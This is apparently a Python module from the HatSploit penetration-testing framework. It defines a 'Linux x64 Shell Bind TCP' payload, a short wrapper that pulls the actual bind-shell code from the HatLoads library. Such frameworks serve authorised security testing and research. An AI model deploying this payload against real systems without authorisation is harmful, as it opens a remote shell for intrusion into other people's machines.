#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatloads import HatLoads


class HatSploitPayload(Payload, HatLoads):
    details = {
        'Name': "Linux x64 Shell Bind TCP",
        'Payload': "linux/x64/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell bind TCP payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "bind_tcp"
    }

    def run(self):
        return self.get_payload(
            self.details['Platform'],
            self.details['Architecture'],
            f"shell_{self.details['Type']}",
            self.handler
        )
